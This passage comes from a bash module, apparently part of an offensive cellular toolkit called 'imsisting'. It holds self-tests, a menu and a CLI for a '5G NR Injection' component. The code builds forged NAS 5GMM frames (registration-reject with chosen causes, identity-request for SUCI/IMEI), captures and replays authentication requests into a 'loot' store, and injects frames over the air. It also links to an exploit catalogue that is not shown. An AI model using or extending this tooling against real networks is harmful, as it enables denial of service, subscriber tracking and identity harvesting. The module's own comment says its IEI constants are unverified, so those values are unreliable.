    chk dci-enc-len "$(fld "$enc" len)" "37"
    chk dci-enc-bits "$(fld "$enc" bitstring)" "1000000101000000100100100110000000000"
    chk dci-enc-hex "$(fld "$enc" hex)" "8140926000"
    # hand-computed field value, asserted independently of the encoder:
    # identifier(1)=1 | fdra(9)=5 | tdra(4)=0 | vrb(1)=0 | mcs(5)=9 | ndi(1)=0
    # | rv(2)=1 | harq(4)=3 | dai(2)=0 | tpc(2)=0 | pri(3)=0 | p2h(3)=0
    chk dci-parse-mcs "$(nrj_dci_parse 8140926000 1_0 24 | awk -F'\t' '$1=="field" && $2=="mcs"{print $4}')" "9"
    chk dci-parse-harq "$(nrj_dci_parse 8140926000 1_0 24 | awk -F'\t' '$1=="field" && $2=="harq_process"{print $4}')" "3"
    chk dci-parse-rv "$(nrj_dci_parse 8140926000 1_0 24 | awk -F'\t' '$1=="field" && $2=="rv"{print $4}')" "1"
    chk dci-parse-fdra "$(nrj_dci_parse 8140926000 1_0 24 | awk -F'\t' '$1=="field" && $2=="fdra"{print $4}')" "5"
    chk dci-parse-id "$(nrj_dci_parse 8140926000 1_0 24 | awk -F'\t' '$1=="field" && $2=="identifier"{print $4}')" "1"
    chk dci-parse-consumed "$(fld "$(nrj_dci_parse 8140926000 1_0 24)" bits_consumed)" "37"
    chk dci-overflow "$(nrj_dci_encode 1_0 "fdra=512" 24 >/dev/null 2>&1; echo $?)" "2"
    chk dci-unknown-field "$(nrj_dci_encode 1_0 "bogus=1" 24 >/dev/null 2>&1; echo $?)" "2"
    chk dci-bad-format "$(nrj_dci_encode 2_0 "a=1" >/dev/null 2>&1; echo $?)" "2"
    chk dci-identifier-1 "$(fld "$(nrj_dci_encode 1_0 "mcs=1" 24)" bitstring | cut -c1)" "1"
    # field widths must sum to the 1_0 payload size for the given BWP
    chk dci-width-sum "$(nrj_dci_1_0_layout 24 | awk -F'\t' '{s+=$2} END{print s}')" "37"
    chk dci-width-sum-106 "$(nrj_dci_1_0_layout 106 | awk -F'\t' '{s+=$2} END{print s}')" "41"

    # 11. MAC RAR, TS 38.321 §6.2.3 — byte-exact against a hand-computed
    #     7-octet body: R(1)=0 | TA=128 (12 bits) | grant=4026 (27 bits) |
    #     T_C-RNTI=4601 (16 bits), packed MSB-first across the whole body.
    local rar
    rar=$(nrj_rar 33 128 4601 4026)
    chk rar-body "$(fld "$rar" body)" "0400000FBA11F9"
    chk rar-bytes "$(fld "$rar" body_bytes)" "7"
    chk rar-sub "$(fld "$rar" subheader)" "61"
    chk rar-ta-hex "$(fld "$rar" ta_hex)" "080"
    chk rar-grant-hex "$(fld "$rar" ul_grant_hex)" "0000FBA"
    chk rar-tcr-hex "$(fld "$rar" tc_rnti_hex)" "11F9"
    chk rar-r "$(fld "$rar" r_field)" "0"
    # Octet 1 carries R plus the top 7 bits of TA: 0 | 0001000 -> 0x04.
    # Octet 2 straddles TA[3:0] and grant[26:23]; a nibble swap here is the
    # classic RAR bug, so assert it directly.
    chk rar-oct1 "$(fld "$rar" body_octets | cut -d' ' -f1)" "04"
    chk rar-oct2 "$(fld "$rar" body_octets | cut -d' ' -f2)" "00"
    chk rar-oct7 "$(fld "$rar" body_octets | cut -d' ' -f7)" "F9"
    # 56 bits is 14 hex digits: R=0 forces the MSB of Octet 1 to 0, so the
    # all-ones body is 7F, never FF.
    chk rar-max "$(fld "$(nrj_rar 63 4095 65535 134217727)" body)" "7FFFFFFFFFFFFF"
    chk rar-zero "$(fld "$(nrj_rar 0 0 0 0)" body)" "00000000000000"
    # T field is 1 whenever a RAPID is present
    chk rar-sub-t "$(nrj_rar 33 128 4601 4026 | awk -F'\t' '$1=="subheader_bits"{print $2}')" "E=0 T=1 RAPID=33"
    chk rar-overflow-ta "$(nrj_rar 0 4096 0 0 >/dev/null 2>&1; echo $?)" "2"
    chk rar-overflow-grant "$(nrj_rar 0 0 0 134217728 >/dev/null 2>&1; echo $?)" "2"
    chk rar-overflow-tcr "$(nrj_rar 0 0 65536 0 >/dev/null 2>&1; echo $?)" "2"
    chk rar-overflow-rapid "$(nrj_rar 64 0 0 0 >/dev/null 2>&1; echo $?)" "2"
    # Backoff Indicator, Table 7.2-1
    chk bi-idx0 "$(fld "$(nrj_rar_backoff 0)" backoff_ms)" "5 ms"
    chk bi-idx2 "$(fld "$(nrj_rar_backoff 2)" backoff_ms)" "20 ms"
    chk bi-idx13 "$(fld "$(nrj_rar_backoff 13)" backoff_ms)" "1920 ms"
    chk bi-reserved14 "$(fld "$(nrj_rar_backoff 14)" backoff_ms)" "Reserved"
    chk bi-by-ms "$(fld "$(nrj_rar_backoff 160)" bi_index)" "8"
    chk bi-octet "$(fld "$(nrj_rar_backoff 2)" subheader)" "02"
    # index 16 does not exist (BI is 4 bits); a ms value off the table fails
    chk bi-bad "$(nrj_rar_backoff 17 >/dev/null 2>&1; echo $?)" "2"
    chk bi-bad-ms "$(nrj_rar_backoff 7 >/dev/null 2>&1; echo $?)" "0"

    # 12. NAS 5GMM frames (TS 24.501), hand-computed octet by octet.
    #     NOTE: these assert the builders, not the IEI constants. The IEIs
    #     are an unverified reading of the spec (see the comment at the
    #     NRJ_IEI_* definitions) — passing here does not certify them.
    chk frame-reg-reject "$(fld "$(nrj_frame registration-reject 31)" hex)" "7E0044001F"
    chk frame-reg-reject-bytes "$(fld "$(nrj_frame registration-reject 31)" bytes)" "5"
    chk frame-reg-reject-cause7 "$(fld "$(nrj_frame registration-reject 7)" hex)" "7E00440007"
    chk frame-identity-suci "$(fld "$(nrj_frame identity-request 1)" hex)" "7E005B01"
    chk frame-identity-imei "$(fld "$(nrj_frame identity-request 3)" hex)" "7E005B03"
    chk frame-identity-bytes "$(fld "$(nrj_frame identity-request 1)" bytes)" "4"
    chk frame-identity-bad "$(nrj_frame identity-request 9 >/dev/null 2>&1; echo $?)" "2"
    local arq
    arq=$(nrj_frame auth-request 000102030405060708090A0B0C0D0E0F 101112131415161718191A1B1C1D1E1F)
    chk frame-auth-hex "$(fld "$arq" hex)" "7E00580021000102030405060708090A0B0C0D0E0F20101112131415161718191A1B1C1D1E1F38020000"
    chk frame-auth-bytes "$(fld "$arq" bytes)" "42"
    chk frame-auth-ngksi "$(fld "$(nrj_frame auth-request 000102030405060708090A0B0C0D0E0F 101112131415161718191A1B1C1D1E1F 3)" hex | cut -c7-8)" "30"
    chk frame-auth-short-rand "$(nrj_frame auth-request 00 11 >/dev/null 2>&1; echo $?)" "2"
    chk frame-auth-bad-ngksi "$(nrj_frame auth-request 000102030405060708090A0B0C0D0E0F 101112131415161718191A1B1C1D1E1F 8 >/dev/null 2>&1; echo $?)" "2"
    chk frame-reg-accept "$(fld "$(nrj_frame reg-accept-aka)" hex)" "7E4000000000007E0042"
    chk frame-reg-accept-ies "$(fld "$(nrj_frame reg-accept-aka 450201)" hex)" "7E4000000000007E0042450201"
    chk frame-reg-accept-bad-ies "$(nrj_frame reg-accept-aka zz >/dev/null 2>&1; echo $?)" "2"
    chk frame-nas-unknown "$(fld "$(nrj_frame nas-unknown 0)" hex)" "7E0000"
    chk frame-nas-unknown-bytes "$(fld "$(nrj_frame nas-unknown 0)" bytes)" "3"
    chk frame-unknown-name "$(nrj_frame bogus >/dev/null 2>&1; echo $?)" "2"

    # 13. auth capture/replay round-trip through the loot store.
    local arhex; arhex=$(fld "$arq" hex)
    chk auth-parse-rand "$(fld "$(nrj_auth_parse "$arhex")" rand)" "000102030405060708090A0B0C0D0E0F"
    chk auth-parse-ngksi "$(fld "$(nrj_auth_parse "$arhex")" ngksi)" "0"
    chk auth-parse-bad "$(nrj_auth_parse 7E0044001F >/dev/null 2>&1; echo $?)" "2"
    chk auth-parse-short "$(nrj_auth_parse 7E00580021 >/dev/null 2>&1; echo $?)" "2"
    nrj_auth_capture "$arhex" >/dev/null
    chk auth-replay-match "$(fld "$(nrj_auth_replay)" match)" "yes"
    chk auth-replay-empty "$(NRJ_DIR="$MOD_TMP/no-such-dir" nrj_auth_replay >/dev/null 2>&1; echo $?)" "3"

    # 14. the send: guard, missing TX path, failed TX, success — via the
    #     VERBS, not the functions (the --descramble bug was verb-only, so
    #     a function-level test would not have caught it). The value is the
    #     independent Python reference for c_init 150765610, not the
    #     function's own answer.
    chk desc-cli-verb "$(fld "$(nrj_cli_main --descramble 9C1F2A3B 4601 0 pusch 42)" plaintext)" "6A59044D"
    chk desc-cli-cinit "$(fld "$(nrj_cli_main --descramble 9C1F2A3B 4601 0 pusch 42)" c_init)" "150765610"
    chk desc-cli-pdcch "$(fld "$(nrj_cli_main --descramble 9C1F 0 0 pdcch 1)" c_init)" "1"
    chk desc-cli-bare "$(nrj_cli_main --descramble 2>/dev/null | grep -c 'rnti_flow')" "1"
    chk bi-ms-5 "$(fld "$(nrj_rar_backoff 5)" backoff_ms)" "5 ms"
    chk bi-ms-10 "$(fld "$(nrj_rar_backoff 10)" backoff_ms)" "10 ms"
    chk bi-idx-10 "$(fld "$(nrj_rar_backoff_idx 10)" backoff_ms)" "320 ms"
    chk bi-idx-octet-10 "$(fld "$(nrj_rar_backoff_idx 10)" subheader)" "0A"
    chk bi-idx-bad "$(nrj_rar_backoff_idx 16 >/dev/null 2>&1; echo $?)" "2"
    chk inject-guard "$(NRJ_TX_ARMED=0 nrj_cli_main --inject 7E0044001F >/dev/null 2>&1; echo $?)" "4"
    chk inject-no-tx "$(NRJ_TX_ARMED=1 nrj_cli_main --inject 7E0044001F >/dev/null 2>&1; echo $?)" "3"
    chk inject-ok "$(NRJ_TX_ARMED=1 NRJ_TX_CMD='cat >/dev/null' nrj_cli_main --inject 7E0044001F 2>/dev/null | awk -F'\t' '$1=="injected"{print $2}')" "7E0044001F"
    chk inject-yes-flag "$(NRJ_TX_ARMED=0 NRJ_TX_CMD='cat >/dev/null' nrj_cli_main --inject --yes 7E0044001F 2>/dev/null | awk -F'\t' '$1=="injected"{print $2}')" "7E0044001F"
    chk inject-bad-hex "$(NRJ_TX_ARMED=1 nrj_cli_main --inject zz >/dev/null 2>&1; echo $?)" "2"
    chk inject-tx-fail "$(NRJ_TX_ARMED=1 NRJ_TX_CMD='exit 1' nrj_cli_main --inject 7E0044001F 2>/dev/null | awk -F'\t' '$1=="injected"{c++} END{print c+0}')" "0"
    chk inject-tx-fail-rc "$(NRJ_TX_ARMED=1 NRJ_TX_CMD='exit 1' nrj_cli_main --inject 7E0044001F >/dev/null 2>&1; echo $?)" "5"

    printf 'ASSERTIONS\t%d\n' "$nchk"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

nrj_menu() {
    while true; do
        banner
        echo "  === 5G NR Injection ==="
        echo
        cat <<'M'
  [1]  RA-RNTI (LTE)
  [2]  RA-RNTI (NR 4-step)
  [3]  LCID reference
  [4]  Build a MAC-NR PDU
  [5]  DCI formats
  [6]  Descramble model
  [7]  Exploit catalogue
  [8]  Over-the-air handoff
  [9]  Gold sequence
  [10] Transport block size
  [11] MAC RAR subPDU
  [0]  back
M
        read -rp "  choice> " c || return 0
        case "$c" in
            1) read -rp "  t_id> " t; read -rp "  f_id> " f; nrj_ra_rnti_lte "$t" "$f"; read -rp "  enter " _ ;;
            2) read -rp "  s_id> " s; read -rp "  t_id> " t; read -rp "  f_id> " f; read -rp "  ul_carrier> " u
               nrj_ra_rnti_nr "${s:-0}" "${t:-0}" "${f:-0}" "${u:-0}"; read -rp "  enter " _ ;;
            3) nrj_lcid_table; read -rp "  enter " _ ;;
            4) read -rp "  lcid> " l; read -rp "  body hex> " b; nrj_mac_pdu "${l:-0}" "$b"; read -rp "  enter " _ ;;
            5) nrj_dci_formats; read -rp "  enter " _ ;;
            6) read -rp "  block hex> " b; read -rp "  rnti> " r
               nrj_descramble "$b" "$r" 0 pusch 0; read -rp "  enter " _ ;;
            7) nrj_exploits; read -rp "  enter " _ ;;
            8) nrj_plan; read -rp "  enter " _ ;;
            9) read -rp "  c_init> " ci; read -rp "  len> " ln; nrj_gold "${ci:-0}" "${ln:-32}"; read -rp "  enter " _ ;;
            10) read -rp "  mcs> " m; read -rp "  n_PRB> " n; read -rp "  symbols [14]> " s; read -rp "  N_oh [0]> " o
                nrj_tbs "${m:-0}" "${n:-1}" "${s:-14}" "${o:-0}"; read -rp "  enter " _ ;;
            11) read -rp "  RAPID> " rp; read -rp "  TA> " ta; read -rp "  T_C-RNTI> " tc; read -rp "  UL grant> " g
                nrj_rar "${rp:-0}" "${ta:-0}" "${tc:-0}" "${g:-0}"; read -rp "  enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

nrj_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)  nrj_status_tsv ;;
        --ra-rnti-lte) nrj_ra_rnti_lte "${1:-}" "${2:-}" ;;
        --ra-rnti-nr)  nrj_ra_rnti_nr "${1:-0}" "${2:-0}" "${3:-0}" "${4:-0}" ;;
        --lcid)        nrj_lcid_class "${1:-}" ;;
        --lcid-table)  nrj_lcid_table ;;
        --mac-pdu)     nrj_mac_pdu "${1:-0}" "${2:-}" ;;
        --mac-sub)     nrj_mac_sub "${1:-0}" "${2:-0}" ;;
        --dci)         nrj_dci_formats ;;
        --dci-parse)   nrj_dci_parse "${1:-}" "${2:-1_0}" "${3:-24}" ;;
        --dci-encode)  nrj_dci_encode "${1:-}" "${2:-}" "${3:-24}" ;;
        --descramble)  nrj_descramble "${1:-}" "${2:-}" "${3:-0}" "${4:-pusch}" "${5:-0}" "${6:-}" ;;
        --gold)        nrj_gold "${1:-}" "${2:-}" ;;
        --tbs)         nrj_tbs "${1:-}" "${2:-}" "${3:-14}" "${4:-0}" "${5:-0}" "${6:-1}" "${7:-1}" ;;
        --rar)         nrj_rar "${1:-}" "${2:-}" "${3:-}" "${4:-}" "${5:-0}" ;;
        --rar-backoff) nrj_rar_backoff "${1:-}" ;;
        --rar-backoff-idx) nrj_rar_backoff_idx "${1:-}" ;;
        --frame)           nrj_frame "$@" ;;
        --auth-capture)    nrj_auth_capture "${1:-}" ;;
        --auth-replay)     nrj_auth_replay ;;
        --inject)          nrj_inject "$@" ;;
        --exploits)    nrj_exploits ;;
        --exploit)     nrj_exploit "${1:-}" ;;
        --plan)        nrj_plan ;;
        --selftest)    nrj_selftest ;;
        --menu)        nrj_menu ;;
        *)
            cat >&2 <<EOF
5G NR Injection — RNTI arithmetic, MAC-NR framing, DCI/TBS/RAR, NAS 5GMM

Usage: $0 COMMAND
  --status-tsv                 module state as TSV
  --ra-rnti-lte <t_id> <f_id>
  --ra-rnti-nr <s_id> <t_id> <f_id> <ul_carrier>
  --lcid <n>                   LCID class; --lcid-table for the reference
  --mac-pdu <lcid> <body_hex>  build a MAC-NR PDU
  --mac-sub <lcid> <len>       build one MAC-NR subheader
  --dci                        NR DCI format reference
  --dci-parse <hex> <1_0|1_1> [N_RB]
                               break a DCI payload into its fields (TS 38.212 7.3.1.2)
  --dci-encode <1_0|1_1> <k=v,...> [N_RB]
                               build a DCI payload field by field
  --descramble <hex> <rnti> [slot] [pusch|pdcch] [n_ID] [laid-out-bits]
                               XOR a scrambled block against the Gold sequence
  --gold <c_init> <len>        Gold pseudo-random sequence (TS 38.211 5.2.1)
  --tbs <mcs> <prb> <symb> <oh> [n_dmrs] [layers] [table]
                               NR transport block size (TS 38.214 5.1.3.2)
  --rar <rapid> <ta> <tc_rnti> <grant> [e]
                               MAC RAR subPDU, 7-octet body (TS 38.321 6.2.3)
  --rar-backoff <ms|index>     Backoff Indicator subheader (TS 38.321 7.2-1)
  --rar-backoff-idx <0..15>    force the BI index reading
  --frame <name> [args]        build a NAS 5GMM frame (TS 24.501);
                               names: registration-reject, identity-request,
                               auth-request, reg-accept-aka, nas-unknown
  --auth-capture <hex>         store an observed Authentication Request
  --auth-replay                rebuild the stored frame; compare octet-exact
  --inject <hex> [--yes]       send a frame via NRJ_TX_CMD (tx-guard armed)
  --exploits | --exploit <n>   the injection exploit set
  --plan                       dual-radio handoff
  --selftest                   verify the arithmetic and framing
  --menu                       interactive menu
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    nrj_cli_main "$@"
fi
